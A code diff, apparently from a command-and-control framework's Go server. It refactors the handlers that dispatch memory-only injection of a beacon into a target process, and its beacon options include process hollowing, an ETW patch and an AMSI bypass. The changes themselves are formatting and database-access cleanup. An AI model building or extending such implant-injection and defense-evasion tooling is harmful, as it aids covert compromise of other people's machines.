@@ -98,11 +98,11 @@ func InjectMem(c *gin.Context) {
 	}
 
 	c.JSON(http.StatusOK, gin.H{"status": 200, "data": gin.H{
-		"uid":   uid,
-		"pid":   pid,
-		"tech":  tech,
-		"bytes": sent,
-		"chunks": seq,
+		"uid":         uid,
+		"pid":         pid,
+		"tech":        tech,
+		"bytes":       sent,
+		"chunks":      seq,
 		"memory_only": true,
 	}})
 }
@@ -176,9 +176,9 @@ func DispatchInject(uid string, pid int, tech string) error {
 		// 失败回写该会话 shell content，控制台可见
 		if database.DB() != nil {
 			var shell database.Shell
-			database.DB().Where("uid = ?", uid).Get(&shell)
+			shell, _, _ = database.Shells().GetByUID(uid)
 			shell.ShellContent += "\n[!] inject failed: " + err.Error() + "\n"
-			database.DB().Where("uid = ?", uid).Update(&shell)
+			_, _ = database.Shells().UpdateContent(uid, shell.ShellContent)
 		}
 		logx.Errorf("❌ [INJECT-DISPATCH] %s 注入失败: %v\n", uid, err)
 		return err
@@ -218,9 +218,9 @@ func dispatchInjectInner(uid string, pid int, tech string) error {
 		VKey:           lis.VKey,
 		EncryptSalt:    lis.EncryptionSalt,
 		QuietMode:      "1",
-		Pass:           "",      // hollow 无命令行参数，禁止口令（ExecuteKey 校验会失败）
-		AutoDelete:     "0",     // 镂空 beacon 以系统/目标进程路径运行，禁止自我删除宿主文件
-		ETWPatch:       "0",     // 注入场景保持最小对抗，避免干扰宿主进程
+		Pass:           "",  // hollow 无命令行参数，禁止口令（ExecuteKey 校验会失败）
+		AutoDelete:     "0", // 镂空 beacon 以系统/目标进程路径运行，禁止自我删除宿主文件
+		ETWPatch:       "0", // 注入场景保持最小对抗，避免干扰宿主进程
 		AmsiBypass:     "0",
 	})
 	if err != nil {
